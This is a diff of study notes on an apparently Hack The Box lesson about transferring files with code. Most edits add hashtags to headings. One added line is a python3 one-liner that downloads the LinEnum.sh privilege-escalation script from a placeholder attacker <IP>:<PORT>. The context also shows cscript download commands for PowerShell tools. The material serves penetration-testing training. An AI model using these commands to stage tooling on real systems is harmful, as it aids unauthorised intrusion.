@@ -9,7 +9,7 @@ According to Wikipedia, there are around [700 programming languages](https://en.
 
 ___
 
-## Python
+## Python #python
 
 Python is a popular programming language. Currently, version 3 is supported, but we may find servers where Python version 2.7 still exists. `Python` can run one-liners from an operating system command line using the option `-c`. Let's see some examples:
 
@@ -29,9 +29,14 @@ Transferring Files with Code
 6165@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
 ```
 
+What worked for me:
+
+```Shell
+6165@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://<IP>:<PORT>/LinEnum.sh", "LinEnum.sh")'
+```
 ___
 
-## PHP
+## PHP #php
 
 `PHP` is also very prevalent and provides multiple file transfer methods. [According to W3Techs' data](https://w3techs.com/technologies/details/pl-php), PHP is used by 77.4% of all websites with a known server-side programming language. Although the information is not precise, and the number may be slightly lower, we will often encounter web services that use PHP when performing an offensive operation.
 
@@ -79,7 +84,7 @@ ___
 
 ___
 
-#### Ruby - Download a File
+#### Ruby - Download a File #ruby
 
 Transferring Files with Code
 
@@ -89,7 +94,7 @@ Transferring Files with Code
 
 ___
 
-#### Perl - Download a File
+#### Perl - Download a File #perl
 
 Transferring Files with Code
 
@@ -99,7 +104,7 @@ Transferring Files with Code
 
 ___
 
-## JavaScript
+## JavaScript #JavaScript
 
 JavaScript is a scripting or programming language that allows you to implement complex features on web pages. Like with other programming languages, we can use it for many different things.
 
@@ -130,7 +135,7 @@ C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShell
 
 ___
 
-## VBScript
+## VBScript #VBS
 
 [VBScript](https://en.wikipedia.org/wiki/VBScript) ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.
 
@@ -164,7 +169,7 @@ C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShel
 
 ___
 
-## Upload Operations using Python3
+## Upload Operations using Python3 #python 
 
 If we want to upload a file, we need to understand the functions in a particular programming language to perform the upload operation. The Python3 [requests module](https://pypi.org/project/requests/) allows you to send HTTP requests (GET, POST, PUT, etc.) using Python. We can use the following code if we want to upload a file to our Python3 [uploadserver](https://github.com/Densaugeo/uploadserver).
 
